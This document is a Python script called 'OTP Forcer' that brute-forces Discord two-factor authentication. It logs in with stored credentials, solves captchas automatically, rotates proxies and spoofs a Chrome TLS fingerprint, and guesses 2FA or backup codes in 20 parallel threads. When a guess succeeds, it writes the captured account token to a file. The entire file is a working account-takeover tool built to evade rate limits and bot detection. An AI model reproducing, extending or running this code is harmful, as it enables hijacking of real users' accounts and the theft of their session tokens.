from tls_client import Session
from os import system, getenv
from random import choice
from threading import Thread
from dotenv import load_dotenv
from yaml import safe_load
from time import sleep, perf_counter, time
from modules.codegen import generate_backup_code, generate_2fa_code
from modules.console import success, error, retrying, solved, logo
from modules.solver import solve_captcha

load_dotenv()
system("cls")

config = safe_load(open("config.yml"))

email = config["account"]["email"]
password = config["account"]["password"]
code_type = config["account"]["code_type"]

proxies = open('data/proxies.txt', 'r').read().splitlines()

class stats:
    retrying = 0
    elapsed = "00:00:00:00"

def elapsed():

    second = 0; minute = 0; hours = 0; days = 0

    while True:

        second+=1
            
        if second == 60: second = 0; minute+=1
        if minute == 60: minute = 0; hours+=1
        if hours == 24: hours = 0; days+=1

        stats.elapsed = f"{str(days).zfill(2)}:{str(hours).zfill(2)}:{str(minute).zfill(2)}:{str(second).zfill(2)}"
        sleep(1)

def title_stat():
    Thread(target=elapsed).start()
    while True:
        system(f"title OTP Forcer │ Retrying: {str(stats.retrying)} │ Elapsed: {stats.elapsed}")
        sleep(0.1)

def login(code):

    proxy = choice(proxies)

    session = Session(client_identifier=f"chrome_114", random_tls_extension_order=True)

    session.proxies = { "http": f"http://{proxy}", "https": f"http://{proxy}" }

    captcha_token = solve_captcha()

    solved(f"{captcha_token[:40]}")

    data = {
        "email": email,
        "password": password,
        "captcha_key": captcha_token,
    }

    try:
        r = session.post("https://discord.com/api/v10/auth/login", json=data)
        print(r.json())
    except:
        login(code)

    data = {
        "code": code,
        "ticket": r.json()['ticket']
    }

    try:
        r = session.post("https://discord.com/api/v9/auth/mfa/totp", json=data)
    except:
        login(code)

    if r.status_code != 200:
        return False

    token = r.json()['token']

    with open("data/result.txt", "w") as f:
        f.write(token)
    
    return True

def main():
    while (True):
        try:
            if code_type == "backup":
                code = generate_backup_code()

            elif code_type == "2fa":
                code = generate_2fa_code()
            else: 
                code = None
  
            stats.retrying += 1
            retrying(f"{code}")

            result = login(code)

            if(result == False):
                error(f"{code}")
            else:
                success(f"{result}")
        except Exception as e:
            print(e)
            pass

def start():
    Thread(target=title_stat).start()
    for i in range(20):
        Thread(target=main).start()

if __name__ == "__main__":
    logo()
    start()